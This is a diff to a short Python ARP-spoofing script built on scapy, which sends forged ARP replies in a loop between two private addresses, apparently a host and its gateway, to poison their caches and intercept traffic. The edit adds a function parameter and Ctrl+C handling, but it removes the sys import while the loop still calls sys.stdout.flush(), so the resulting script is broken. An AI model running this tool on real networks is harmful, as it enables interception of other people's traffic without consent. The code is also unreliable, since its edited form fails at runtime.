@@ -1,6 +1,4 @@
 #/usr/bin/env python
-import sys
-
 from scapy.layers.l2 import ARP, Ether
 import scapy.all as scapy
 import time
@@ -13,16 +11,19 @@ def get_mac(ip):
     answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_ip, spoof_ip, get_mac_address):
+    target_mac = get_mac_address(target_ip)
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
 sent_packets_count = 0
-while True:
-    spoof("192.168.63.174","192.168.63.2")
-    spoof("192.168.63.2","192.168.63.174")
-    sent_packets_count += 1
-    print(f"\r[+] Packet Count: " + str(sent_packets_count*2), end=""),
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.63.174","192.168.63.2", get_mac)
+        spoof("192.168.63.2","192.168.63.174", get_mac)
+        sent_packets_count += 2
+        print("\r[+] Packet Count: " + str(sent_packets_count)),
+        sys.stdout.flush()
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL+C ...... Quitting.")
